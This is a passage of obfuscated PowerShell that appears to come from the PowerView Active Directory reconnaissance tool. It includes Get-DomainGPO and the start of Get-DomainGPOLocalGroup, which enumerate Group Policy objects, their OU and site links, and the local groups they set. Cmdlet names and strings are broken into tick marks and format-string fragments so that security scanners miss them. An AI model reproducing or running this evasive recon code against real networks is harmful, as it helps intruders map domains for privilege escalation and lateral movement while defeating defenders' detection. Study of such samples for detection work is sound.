                ${mEmb`E`RS} = ${_}."pr`o`PEr`TieS"."me`mbe`RS" | &("{3}{2}{0}{1}" -f'c','t-Object','ele','S') -ExpandProperty ("{2}{1}{0}" -f 'mber','e','M') | &("{3}{0}{2}{1}" -f'ere-','ct','Obje','Wh') { ${_}."a`cTiOn" -match 'ADD' } | &("{2}{3}{1}{0}{4}" -f 'je','b','ForEach','-O','ct') {
                    if (${_}."S`iD") { ${_}."s`ID" }
                    else { ${_}."n`AMe" }
                }

                if (${Me`MBe`RS}) {
                    
                    if (${_}."fI`LTERS") {
                        ${f`IlT`ERs} = ${_}."FIL`Te`Rs".("{1}{3}{2}{0}"-f'r','Get','to','Enumera').Invoke() | &("{0}{2}{1}{3}{4}" -f'ForE','ch','a','-O','bject') {
                            &("{2}{0}{1}"-f'b','ject','New-O') -TypeName ("{2}{0}{1}" -f 'SObj','ect','P') -Property @{("{1}{0}"-f 'pe','Ty') = ${_}."L`oC`A`lname";("{1}{0}" -f'lue','Va') = ${_}."na`ME"}
                        }
                    }
                    else {
                        ${fIl`T`ERs} = ${n`Ull}
                    }

                    if (${m`em`BERs} -isnot [System.Array]) { ${meM`BErs} = @(${M`Em`BErs}) }

                    ${gRO`UP`Sxml} = &("{2}{1}{0}" -f'Object','w-','Ne') ("{1}{0}"-f 'bject','PSO')
                    ${gR`OuPs`XMl} | &("{0}{2}{1}"-f'Add','mber','-Me') ("{1}{0}{2}{3}"-f 'otep','N','ro','perty') ("{0}{1}"-f'GPOP','ath') ${TaRgETgrOU`p`s`XML`pA`Th}
                    ${Gr`ou`PSX`Ml} | &("{2}{0}{1}" -f'Mem','ber','Add-') ("{1}{2}{0}{3}"-f 'ert','No','teprop','y') ("{2}{0}{1}" -f'er','s','Filt') ${f`Il`TeRs}
                    ${GR`o`UpSxML} | &("{0}{2}{1}"-f 'Add-','ember','M') ("{0}{3}{2}{1}" -f'No','rty','prope','te') ("{0}{2}{1}"-f'Gr','e','oupNam') ${Gro`UP`N`AmE}
                    ${Gr`OupSx`Ml} | &("{1}{0}{2}" -f 'dd-','A','Member') ("{1}{3}{0}{2}" -f'pro','No','perty','te') ("{1}{2}{0}" -f'pSID','Gr','ou') ${gro`UPsiD}
                    ${gr`Oup`sX`mL} | &("{0}{3}{1}{2}" -f'Ad','emb','er','d-M') ("{2}{1}{0}{3}" -f'per','epro','Not','ty') ("{0}{2}{1}"-f 'G','oupMemberOf','r') ${nu`Ll}
                    ${Gr`Oup`sxml} | &("{0}{1}{2}"-f 'Add-','Mem','ber') ("{2}{1}{0}"-f 'y','propert','Note') ("{2}{1}{3}{0}"-f 'bers','roupMe','G','m') ${ME`Mbe`RS}
                    ${GrOUP`S`XML}."psOBJ`E`ct"."T`Yp`eNaMES".("{1}{0}" -f'rt','Inse').Invoke(0, ("{2}{3}{4}{0}{1}"-f'psXM','L','PowerV','iew.Gro','u'))
                    ${gr`O`UP`sxml}
                }
            }
        }
        catch {
            &("{2}{0}{3}{1}"-f 'ite','erbose','Wr','-V') ('[Get-Gr'+'ou'+'psX'+'ML] '+'Err'+'or '+'parsin'+'g'+' '+"$TargetGroupsXMLPath "+': '+"$_")
        }
    }

    END {
        
        ${map`pE`dPATHs}."k`EYS" | &("{2}{0}{3}{1}" -f 'h-','ect','ForEac','Obj') { &("{4}{2}{1}{5}{7}{0}{3}{6}"-f 'eConn','move-','e','ect','R','Rem','ion','ot') -Path ${_} }
    }
}


function get`-do`MaIngpo {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}" -f'PSS','houldPro','cess'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{6}{7}{5}{0}{8}{4}"-f 'hanA','P','SU','seD','ents','T','eclaredVarsMor','e','ssignm'}, '')]
    [OutputType({"{2}{0}{1}" -f 'Vie','w.GPO','Power'})]
    [OutputType({"{0}{3}{1}{2}" -f'Po','PO','.Raw','werView.G'})]
    [CmdletBinding(defAultParAMETErSeTnAmE = {"{1}{0}"-f'e','Non'})]
    Param(
        [Parameter(pOsITiON = 0, VAlUefrOmPiPeLINe = ${T`RUE}, VAlueFroMpiPeLiNEByPROpErtYNaME = ${Tr`UE})]
        [Alias({"{3}{4}{1}{0}{2}"-f'nguishedNa','ti','me','D','is'}, {"{1}{3}{2}{0}{4}"-f 'o','Sa','c','mAc','untName'}, {"{1}{0}"-f 'ame','N'})]
        [String[]]
        ${I`DEN`TitY},

        [Parameter(pAramEteRsEtnaME = "c`O`MPUt`erI`DEnTItY")]
        [Alias({"{3}{0}{1}{2}" -f 'mputer','Nam','e','Co'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${COMP`Ut`ERid`EnTiTY},

        [Parameter(pARAMetErseTnamE = "Us`ER`id`EnTITy")]
        [Alias({"{0}{1}" -f 'UserNa','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${uSERI`D`eNT`ity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doMA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'F','ilter'})]
        [String]
        ${LDaP`FiL`T`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrOpErT`I`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'Path','ADS'})]
        [String]
        ${sE`ArC`HbASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}" -f 'Dom','ller','Contro','ain'})]
        [String]
        ${sER`V`Er},

        [ValidateSet({"{0}{1}" -f 'B','ase'}, {"{1}{0}" -f 'neLevel','O'}, {"{0}{1}"-f 'Subt','ree'})]
        [String]
        ${se`A`RChscoPe} = ("{0}{1}" -f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSuLt`paGES`i`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RVer`TiM`E`LiMIt},

        [ValidateSet({"{0}{1}" -f 'D','acl'}, {"{1}{0}" -f 'oup','Gr'}, {"{0}{1}"-f 'No','ne'}, {"{1}{0}" -f'er','Own'}, {"{0}{1}"-f 'S','acl'})]
        [String]
        ${se`CuRiTYMa`s`ks},

        [Switch]
        ${to`mBS`T`oNe},

        [Alias({"{1}{2}{0}"-f'turnOne','R','e'})]
        [Switch]
        ${fi`Nd`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RedenTI`Al} =  ${5R0`Vk}::"emp`TY",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${SEaRchEr`ArG`Umen`Ts} = @{}
        if (${P`sboun`Dp`Ara`mEtERs}[("{1}{0}"-f 'n','Domai')]) { ${s`E`ArCHeRarGum`eNTs}[("{0}{1}" -f'Domai','n')] = ${d`om`AIN} }
        if (${psBoUndP`Ar`Ame`T`ers}[("{2}{1}{0}"-f 'es','operti','Pr')]) { ${S`eARCHeRAR`gu`m`EntS}[("{2}{0}{1}"-f 'r','ties','Prope')] = ${PROp`e`RTIeS} }
        if (${p`sB`OuND`PaRaM`eTe`RS}[("{0}{2}{1}" -f 'S','rchBase','ea')]) { ${SEa`RChEra`RGU`MENTs}[("{3}{1}{0}{2}"-f'Ba','rch','se','Sea')] = ${SE`A`RcHbA`sE} }
        if (${PSbOun`D`ParaMe`T`e`Rs}[("{1}{0}"-f 'r','Serve')]) { ${sEaR`cHer`A`RguM`e`Nts}[("{1}{0}"-f 'rver','Se')] = ${S`ErV`eR} }
        if (${PsBo`UNDpA`Ra`met`ErS}[("{1}{2}{0}"-f 'ope','Se','archSc')]) { ${S`ear`cHera`R`g`UmEnTS}[("{1}{2}{0}"-f 'e','S','earchScop')] = ${SeAR`chSc`oPE} }
        if (${psboUN`Dp`A`Ram`EteRS}[("{1}{0}{2}" -f 'Siz','ResultPage','e')]) { ${s`eaRcHEra`R`GumENts}[("{4}{3}{2}{0}{1}"-f 'Siz','e','age','ultP','Res')] = ${R`EsUl`TpAgeSI`Ze} }
        if (${psB`OuNdpar`A`MET`e`RS}[("{3}{4}{2}{1}{0}"-f'Limit','ime','verT','S','er')]) { ${sEar`C`h`Er`ARGumeNTs}[("{4}{3}{1}{2}{0}"-f'it','ime','Lim','rverT','Se')] = ${s`ERVeRT`iMEl`I`M`It} }
        if (${P`s`BO`UN`Dp`ARaMEtERs}[("{2}{1}{0}"-f 'sks','ityMa','Secur')]) { ${Sear`cheRA`RgU`ME`Nts}[("{3}{2}{0}{1}"-f 'Mas','ks','ty','Securi')] = ${SECurI`Tyma`s`Ks} }
        if (${PsBoUN`Dpar`AMeTE`RS}[("{0}{1}{2}"-f'T','ombs','tone')]) { ${Sea`RcHE`RA`RGumEnTs}[("{0}{1}{2}"-f'T','omb','stone')] = ${To`mbStO`NE} }
        if (${pSbO`Un`dpa`RAM`EtErs}[("{0}{2}{1}"-f'Cre','tial','den')]) { ${s`eARc`heR`ARgu`mENTS}[("{2}{0}{3}{1}"-f'e','tial','Cred','n')] = ${c`R`edEnT`ial} }
        ${GPosE`Ar`CheR} = &("{1}{3}{0}{2}" -f'nSearche','Get-','r','Domai') @SearcherArguments
    }

    PROCESS {
        if (${gP`oSE`ARC`HEr}) {
            if (${PSBo`U`NDparaM`etErS}[("{3}{1}{2}{0}"-f 'ntity','uterI','de','Comp')] -or ${psBo`U`NdPARaME`T`E`RS}[("{0}{2}{1}"-f 'UserId','tity','en')]) {
                ${GPOa`d`s`pAThs} = @()
                if (${s`eAR`C`hERAR`GUmeNTS}[("{1}{2}{0}{3}" -f 'pertie','Pr','o','s')]) {
                    ${O`l`DpRo`p`erTiES} = ${SE`Arche`Ra`R`GUm`Ents}[("{2}{0}{3}{1}" -f'e','ties','Prop','r')]
                }
                ${Se`A`R`che`Ra`RGUmENtS}[("{2}{1}{0}" -f 'operties','r','P')] = ("{7}{6}{0}{4}{3}{8}{2}{1}{5}"-f 'inguishe','am','hostn','m','dna','e','ist','d','e,dns')
                ${TaRg`etCOMPU`T`ERNAME} = ${n`UlL}

                if (${p`Sb`OunDP`A`RaM`eTErs}[("{4}{3}{1}{2}{0}"-f 'dentity','t','erI','pu','Com')]) {
                    ${SeaR`cHeRA`RGU`m`EnTs}[("{1}{0}" -f 'ty','Identi')] = ${CoMput`ErI`dentI`Ty}
                    ${cO`MpuTeR} = &("{0}{2}{1}{3}{5}{4}" -f'Get-','m','Do','ainC','mputer','o') @SearcherArguments -FindOne | &("{2}{3}{4}{1}{0}"-f 't','c','Sele','c','t-Obje') -First 1
                    if(-not ${c`om`PUtEr}) {
                        &("{0}{1}{2}{3}" -f'Wr','ite-Verb','os','e') ('['+'Get-DomainGP'+'O]'+' '+'C'+'omput'+'er '+"'$ComputerIdentity' "+'no'+'t '+'fou'+'n'+'d!')
                    }
                    ${Ob`JeCt`DN} = ${cOmp`Ut`ER}."D`iSti`NGUIS`hED`Name"
                    ${TArgETcO`MPUT`E`RNAME} = ${Com`PuteR}."DnSHo`stnA`ME"
                }
                else {
                    ${Se`Archer`A`RGU`mEntS}[("{2}{0}{1}" -f 't','y','Identi')] = ${U`s`ER`idenT`ItY}
                    ${Us`Er} = &("{3}{0}{4}{2}{1}"-f'et','er','DomainUs','G','-') @SearcherArguments -FindOne | &("{2}{0}{1}" -f 'bj','ect','Select-O') -First 1
                    if(-not ${u`SEr}) {
                        &("{3}{0}{1}{2}" -f'e','rbos','e','Write-V') ('[Get-Do'+'main'+'G'+'PO] '+'Use'+'r '+"'$UserIdentity' "+'not'+' '+'fou'+'n'+'d!')
                    }
                    ${OB`jEct`DN} = ${US`eR}."DI`StingUi`S`hEdName"
                }

                
                ${ob`JEc`TOUS} = @()
                ${oB`jEc`TOUS} += ${ObJe`C`TDn}.("{1}{0}" -f'it','spl').Invoke(',') | &("{1}{0}{3}{2}"-f'orEa','F','t','ch-Objec') {
                    if(${_}.("{2}{0}{3}{1}"-f 'tartsw','th','s','i').Invoke('OU=')) {
                        ${ob`J`eCtdn}.("{2}{0}{1}"-f 'r','ing','SubSt').Invoke(${oBJ`Ect`DN}.("{2}{0}{1}" -f 'nde','xOf','I').Invoke("$($_),"))
                    }
                }
                &("{0}{1}{3}{2}" -f 'Write-','Ve','se','rbo') ('['+'Get-Doma'+'inG'+'PO] '+'ob'+'ject '+'O'+'Us: '+"$ObjectOUs")

                if (${O`Bj`Ect`OUs}) {
                    
                    ${se`ARche`RaR`G`UMEnts}.("{1}{0}{2}" -f 'o','Rem','ve').Invoke(("{2}{1}{0}" -f 'es','ti','Proper'))
                    ${INheRItA`NC`Ed`isAb`lEd} = ${fA`lse}
                    ForEach(${oB`jec`Tou} in ${ObJe`C`ToUs}) {
                        ${S`EAr`che`RaRg`UmenTs}[("{0}{2}{1}"-f 'Id','ty','enti')] = ${O`B`j`ecTOU}
                        ${GPOAD`S`PAThs} += &("{2}{0}{1}{3}"-f'Do','main','Get-','OU') @SearcherArguments | &("{3}{1}{0}{2}{4}"-f'h-O','orEac','b','F','ject') {
                            
                            if (${_}."G`PLINk") {
                                ${_}."G`P`LInk"."sPl`iT"('][') | &("{0}{2}{3}{1}" -f 'ForEac','ct','h-O','bje') {
                                    if (${_}.("{2}{0}{1}" -f 'sw','ith','start').Invoke(("{1}{0}"-f'P','LDA'))) {
                                        ${PA`R`TS} = ${_}.("{1}{0}"-f'lit','sp').Invoke(';')
                                        ${GPO`Dn} = ${PAr`Ts}[0]
                                        ${enF`Or`Ced} = ${PaR`TS}[1]

                                        if (${I`NH`e`RItAN`Cedi`sAbLed}) {
                                            
                                            
                                            if (${enFor`C`eD} -eq 2) {
                                                ${G`P`Odn}
                                            }
                                        }
                                        else {
                                            
                                            ${gP`odN}
                                        }
                                    }
                                }
                            }

                            
                            if (${_}."GpO`PT`IoNS" -eq 1) {
                                ${INhE`RitanceD`I`S`AblEd} = ${t`RUe}
                            }
                        }
                    }
                }

                if (${TArGe`TCO`mPut`e`RNA`mE}) {
                    
                    ${C`Om`PUTersiTE} = (&("{2}{0}{4}{1}{3}" -f'et-NetCompu','iteNa','G','me','terS') -ComputerName ${T`Arg`etcO`m`PU`Te`RnamE})."SI`T`eNaME"
                    if(${Co`M`put`ERsIte} -and (${C`ompuT`E`RSiTE} -notlike ("{1}{0}"-f'rror*','E'))) {
                        ${SE`A`RcHErarGu`ME`NTs}[("{0}{1}{2}"-f 'Ide','nti','ty')] = ${cOmPu`T`e`RsiTE}
                        ${gp`oadS`pathS} += &("{3}{4}{1}{2}{0}"-f 'inSite','-Do','ma','Ge','t') @SearcherArguments | &("{2}{4}{1}{0}{3}" -f 'c','e','For','t','Each-Obj') {
                            if(${_}."G`pLink") {
                                
                                ${_}."g`Pl`inK"."Spl`iT"('][') | &("{1}{0}{3}{2}"-f'ch','ForEa','ject','-Ob') {
                                    if (${_}.("{2}{0}{1}" -f'swit','h','start').Invoke(("{1}{0}" -f 'AP','LD'))) {
                                        ${_}.("{0}{1}"-f's','plit').Invoke(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                
                ${O`B`Jec`TdOMaI`Ndn} = ${OBJ`eCT`dn}.("{0}{1}{2}"-f 'SubStr','i','ng').Invoke(${oBje`C`TDn}.("{1}{0}" -f'f','IndexO').Invoke('DC='))
                ${sEaRche`R`A`R`guM`eNTs}.("{0}{1}{2}"-f'Remo','v','e').Invoke(("{1}{2}{0}"-f 'ty','Iden','ti'))
                ${sEARCH`E`RaRgU`m`EnTs}.("{2}{0}{1}"-f 'm','ove','Re').Invoke(("{2}{1}{0}"-f's','ertie','Prop'))
                ${sea`RC`HE`R`ArgUmeN`Ts}[("{3}{2}{1}{0}" -f 'er','t','DAPFil','L')] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                ${g`po`ADS`patHS} += &("{1}{0}{3}{4}{2}" -f 'Do','Get-','inObject','m','a') @SearcherArguments | &("{0}{1}{2}"-f'ForE','ach-Objec','t') {
                    if(${_}."gP`L`Ink") {
                        
                        ${_}."g`PLiNK"."S`PLit"('][') | &("{2}{4}{3}{0}{1}"-f 'bje','ct','ForE','h-O','ac') {
                            if (${_}.("{0}{2}{1}{3}" -f 'start','it','sw','h').Invoke(("{0}{1}" -f'LDA','P'))) {
                                ${_}.("{0}{1}"-f's','plit').Invoke(';')[0]
                            }
                        }
                    }
                }
                &("{0}{2}{1}"-f 'Writ','erbose','e-V') ('[Get'+'-Domai'+'n'+'G'+'PO] '+'G'+'P'+'OAdsPaths:'+' '+"$GPOAdsPaths")

                
                if (${O`LDP`RopErTi`eS}) { ${SEARc`h`erA`RGUM`ENTs}[("{2}{0}{1}" -f'e','rties','Prop')] = ${oLDp`RopeR`TI`Es} }
                else { ${Se`A`RCherArG`UmE`Nts}.("{0}{1}{2}"-f 'R','emo','ve').Invoke(("{2}{1}{0}" -f 's','e','Properti')) }
                ${SeaR`cHERArGu`Me`Nts}.("{2}{0}{1}"-f'emov','e','R').Invoke(("{1}{2}{0}" -f'ty','Id','enti'))

                ${GpOadS`P`A`ThS} | &("{0}{2}{1}" -f 'Whe','t','re-Objec') {${_} -and (${_} -ne '')} | &("{0}{2}{1}"-f 'ForEach-O','ect','bj') {
                    
                    ${sEar`CHeRA`RGuM`EnTS}[("{1}{3}{2}{0}" -f 'se','Searc','a','hB')] = ${_}
                    ${s`EArCH`eRARgumen`Ts}[("{2}{0}{1}"-f 'APFilt','er','LD')] = (("{5}{4}{1}{3}{2}{6}{0}"-f 'ontainer)','gr','pPolicy','ou','ectCategory=','(obj','C'))
                    &("{3}{2}{1}{0}{4}"-f 'Ob','omain','-D','Get','ject') @SearcherArguments | &("{3}{1}{0}{2}" -f '-','h','Object','ForEac') {
                        if (${P`SBOU`NdPa`RAMeTE`Rs}['Raw']) {
                            ${_}."P`s`ObJECT"."T`yp`eNA`Mes".("{1}{0}"-f'ert','Ins').Invoke(0, ("{1}{2}{0}{3}{4}" -f 'View.G','P','ower','PO','.Raw'))
                        }
                        else {
                            ${_}."Ps`Ob`jecT"."t`YPen`AMes".("{2}{1}{0}"-f't','er','Ins').Invoke(0, ("{3}{0}{2}{1}" -f'wer','iew.GPO','V','Po'))
                        }
                        ${_}
                    }
                }
            }
            else {
                ${idEnTit`Yf`i`lteR} = ''
                ${fIL`T`er} = ''
                ${IDen`Ti`Ty} | &("{1}{0}{3}{2}" -f '-Obj','Where','ct','e') {${_}} | &("{2}{1}{0}{4}{3}"-f 'rEach-O','o','F','ject','b') {
                    ${i`dE`NtityiNs`TA`NCE} = ${_}.("{1}{0}"-f'place','Re').Invoke('(', '\28').("{0}{1}{2}" -f'R','epla','ce').Invoke(')', '\29')
                    if (${iDEnTitY`I`NS`T`A`Nce} -match ((("{0}{1}{3}{2}" -f 'LD','A','N=.*','P://{0}^C'))  -F[CHaR]124)) {
                        ${IdENti`TYfI`l`TEr} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${Psb`ound`PA`RamETeRs}[("{0}{1}{2}"-f'D','o','main')]) -and (-not ${p`sb`oUN`DpARAm`ET`Ers}[("{0}{1}{2}"-f 'Searc','hBas','e')])) {
                            
                            
                            ${I`dEn`TityD`omAIN} = ${iDEnTItY`I`Nst`A`Nce}.("{2}{1}{0}" -f 'g','trin','SubS').Invoke(${iDENT`i`TYInstaN`CE}.("{0}{1}"-f'Index','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{2}{0}{3}{1}" -f 'ite-','rbose','Wr','Ve') ('['+'Get-'+'DomainGP'+'O] '+'Extr'+'acted'+' '+'d'+'omain'+' '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                            ${SeARC`HeraRg`U`m`E`NtS}[("{1}{0}" -f'main','Do')] = ${iDeN`TiT`ydoM`AIN}
                            ${GpO`sEA`RC`HeR} = &("{2}{0}{5}{1}{3}{4}"-f 'a','ear','Get-Dom','c','her','inS') @SearcherArguments
                            if (-not ${g`pO`sEAR`cher}) {
                                &("{0}{3}{2}{1}" -f 'W','arning','W','rite-') ('['+'G'+'et-D'+'omainGPO'+']'+' '+'Un'+'able '+'to'+' '+'re'+'tr'+'ieve '+'doma'+'in '+'s'+'earcher'+' '+'for'+' '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${IDe`NT`iTYiN`s`TANCe} -match '{.*}') {
                        ${I`D`e`N`TITYfILtEr} += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            ${guiDB`y`TesTRinG} = (-Join (([Guid]${id`En`Ti`TYi`NstANce}).("{2}{0}{1}" -f't','eArray','ToBy').Invoke() | &("{0}{2}{1}"-f'ForEach-Obj','ct','e') {${_}.("{1}{0}" -f 'String','To').Invoke('X').("{1}{2}{0}" -f 'eft','Pa','dL').Invoke(2,'0')})) -Replace (("{1}{0}"-f '..)','(')),'\$1'
                            ${I`dEN`TIty`F`ILter} += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            ${IDe`NTitYFILt`Er} += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if (${iDe`NT`ityF`IL`TER} -and (${IdEnTI`TyFil`TER}.("{0}{1}" -f 'T','rim').Invoke() -ne '') ) {
                    ${FI`LT`ER} += "(|$IdentityFilter)"
                }

                if (${PS`BoUnD`pArAmETe`Rs}[("{2}{0}{1}" -f 'AP','Filter','LD')]) {
                    &("{0}{1}{2}{3}" -f'Writ','e','-Ve','rbose') ('[Ge'+'t-'+'Domai'+'nGPO] '+'U'+'sing '+'add'+'it'+'i'+'onal '+'LDA'+'P '+'filter'+': '+"$LDAPFilter")
                    ${F`ILTEr} += "$LDAPFilter"
                }

                ${G`poSE`ARCHer}."F`I`lTeR" = "(&(objectCategory=groupPolicyContainer)$Filter)"
                &("{3}{0}{2}{1}{4}" -f'ite','o','-Verb','Wr','se') "[Get-DomainGPO] filter string: $($GPOSearcher.filter) "

                if (${P`S`BoUNdParA`MEtE`Rs}[("{0}{1}"-f'FindOn','e')]) { ${Re`sUl`Ts} = ${GpOse`AR`c`her}.("{0}{2}{1}" -f'Fin','e','dOn').Invoke() }
                else { ${R`ESU`Lts} = ${g`PoSEA`RCHer}.("{0}{1}{2}"-f'Fi','ndA','ll').Invoke() }
                ${RE`SuLTs} | &("{3}{2}{1}{0}" -f't','re-Objec','e','Wh') {${_}} | &("{0}{3}{2}{1}" -f'ForE','t','jec','ach-Ob') {
                    if (${Ps`B`OUNdparA`mEteRS}['Raw']) {
                        
                        ${g`pO} = ${_}
                        ${G`po}."p`so`BjECT"."tYpeN`Am`ES".("{1}{0}"-f 'sert','In').Invoke(0, ("{4}{5}{3}{2}{0}{1}" -f'O.R','aw','GP','ew.','Powe','rVi'))
                    }
                    else {
                        if (${psBOu`NdpAR`AMet`eRS}[("{1}{0}{2}"-f'e','S','archBase')] -and (${seA`RcHb`ASE} -Match ("{1}{0}" -f '://','^GC'))) {
                            ${G`po} = &("{2}{0}{1}{4}{5}{3}"-f 'o','nv','C','PProperty','e','rt-LDA') -Properties ${_}."P`R`oPerTiES"
                            try {
                                ${g`Po`dn} = ${g`PO}."dIsTI`N`guiS`h`ednaMe"
                                ${gp`ODO`M`Ain} = ${G`pODn}.("{1}{2}{0}"-f 'String','S','ub').Invoke(${G`Po`dn}.("{1}{2}{0}" -f'exOf','I','nd').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                                ${G`P`c`FIleSys`PatH} = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                ${g`Po} | &("{1}{3}{0}{2}"-f 'be','Add','r','-Mem') ("{2}{1}{0}{3}" -f'r','prope','Note','ty') ("{2}{0}{3}{1}"-f'ilesysp','th','gpcf','a') ${GpcfIl`ESy`spaTH}
                            }
                            catch {
                                &("{2}{1}{0}"-f'ose','e-Verb','Writ') "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname) "
                            }
                        }
                        else {
                            ${G`po} = &("{4}{1}{0}{2}{3}"-f 'LDAPP','t-','rop','erty','Conver') -Properties ${_}."Pro`pe`RTIeS"
                        }
                        ${g`PO}."Ps`ObJE`CT"."TYPEn`A`meS".("{1}{0}"-f 'rt','Inse').Invoke(0, ("{0}{2}{1}" -f'PowerVie','.GPO','w'))
                    }
                    ${G`pO}
                }
                if (${re`s`ULts}) {
                    try { ${rE`SUL`Ts}.("{1}{0}"-f 'ose','disp').Invoke() }
                    catch {
                        &("{1}{0}{2}{4}{3}" -f 'ite','Wr','-V','e','erbos') ('[Get-'+'D'+'omainGP'+'O] '+'E'+'rror '+'dis'+'posin'+'g '+'of'+' '+'the'+' '+'Resu'+'l'+'ts '+'o'+'bject:'+' '+"$_")
                    }
                }
                ${GpoS`E`A`RchER}.("{0}{1}{2}" -f 'd','i','spose').Invoke()
            }
        }
    }
}


function G`Et`-`dOMa`INg`pOloCA`lGrOuP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}" -f 'PSS','ocess','dPr','houl'}, '')]
    [OutputType({"{0}{2}{1}{3}" -f 'Power','.GPOGrou','View','p'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsItiOn = 0, ValuefrompiPeliNe = ${T`Rue}, VALuEFRomPipeLinebyPrOPERtyNaME = ${T`RUe})]
        [Alias({"{4}{1}{0}{2}{3}{5}" -f'is','gu','hed','Na','Distin','me'}, {"{0}{1}{3}{2}" -f 'SamA','c','ntName','cou'}, {"{0}{1}"-f'Nam','e'})]
        [String[]]
        ${iDen`Ti`TY},

        [Switch]
        ${re`S`o`lVeMEmbERs`TO`Sids},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'r','Filte'})]
        [String]
        ${l`DapFi`LT`Er},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'h','DSPat','A'})]
        [String]
        ${s`e`ARcHBASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}" -f 'roller','ainC','Dom','ont'})]
        [String]
        ${SEr`V`eR},

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{2}{1}{0}"-f'l','Leve','One'}, {"{1}{0}"-f'ee','Subtr'})]
        [String]
        ${sEAR`CHS`Co`Pe} = ("{1}{0}" -f'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resul`TpA`geSiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`Rv`ErTim`el`iMIT},

        [Switch]
        ${TOMBst`O`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReDEn`Ti`Al} =   (&("{0}{1}"-f 'C','HILDItEM') ("{2}{0}{1}{3}{4}"-f'AR','iAbLE','v',':','5r0Vk')  )."v`ALUe"::"EM`Pty"
    )

    BEGIN {
        ${SE`ArcH`eRARG`UMEnts} = @{}
        if (${PSbOUNd`pArAMe`T`e`Rs}[("{0}{1}" -f 'Domai','n')]) { ${s`E`AR`cHERARGu`mEntS}[("{0}{1}" -f 'Domai','n')] = ${d`OMAIn} }
        if (${PS`BOuNd`PA`RAmEtE`Rs}[("{1}{2}{0}"-f 'Filter','LDA','P')]) { ${SearCh`erarGuME`N`TS}[("{2}{0}{1}"-f 'APF','ilter','LD')] = ${dOMa`in} }
        if (${pSBounDPaR`A`meT`Ers}[("{0}{3}{2}{1}"-f'Se','Base','rch','a')]) { ${SEARChe`R`Argu`MeNts}[("{2}{0}{3}{1}"-f'earc','se','S','hBa')] = ${sEa`R`cHb`AsE} }
        if (${p`s`BOU`NdP`ArAmeTERS}[("{2}{0}{1}" -f 'r','ver','Se')]) { ${S`eaR`c`he`RaRG`UMents}[("{0}{2}{1}" -f 'Serv','r','e')] = ${Serv`Er} }
        if (${Psbou`N`dpARamE`TeRs}[("{0}{1}{2}" -f 'Searc','hSco','pe')]) { ${SEARCHerA`Rgu`me`NTs}[("{0}{3}{2}{1}" -f 'S','e','archScop','e')] = ${Se`A`R`CHscopE} }
        if (${P`sB`Ou`ND`PAR`Ameters}[("{0}{2}{1}"-f'Re','ultPageSize','s')]) { ${s`eArCH`ERargUMeN`TS}[("{1}{3}{0}{4}{2}"-f'age','Resu','ize','ltP','S')] = ${RESU`Lt`pag`ESI`zE} }
        if (${p`sboUnD`PArAmete`Rs}[("{1}{0}{2}{3}"-f 'r','Se','verTimeLim','it')]) { ${SEA`R`cHeraR`gum`ENTs}[("{1}{3}{4}{2}{0}"-f'meLimit','Ser','Ti','v','er')] = ${s`Erv`ERTimEliM`IT} }
        if (${PSB`O`U`N`dparAMEtE`Rs}[("{2}{0}{1}" -f 'ston','e','Tomb')]) { ${SEar`cHer`ARGUm`En`TS}[("{1}{0}{2}" -f'n','Tombsto','e')] = ${toMb`sT`O`Ne} }
        if (${p`Sb`O`UNDPar`AM`ETERs}[("{2}{1}{0}" -f 'l','ia','Credent')]) { ${sE`A`R`c`HE`RArGUMeNTs}[("{1}{0}{2}"-f'enti','Cred','al')] = ${CRed`e`N`TIAL} }

        ${cO`NVe`RT`ARGU`mENts} = @{}
        if (${psB`O`Un`DP`ArA`mETeRS}[("{0}{1}" -f 'Domai','n')]) { ${C`ONVEr`Ta`RGUmEntS}[("{0}{1}" -f'Doma','in')] = ${Do`mA`IN} }
        if (${p`sb`OuNd`pARAMe`TE`Rs}[("{1}{0}"-f 'ver','Ser')]) { ${con`V`e`Rt`ARgUMENTs}[("{2}{0}{1}" -f 'rve','r','Se')] = ${seR`VER} }
        if (${pSb`OUNd`p`ARAMe`TerS}[("{1}{2}{0}"-f'al','Crede','nti')]) { ${cON`VERTA`RgU`m`e`NTS}[("{0}{2}{1}"-f 'C','ntial','rede')] = ${CREDE`Nt`I`Al} }

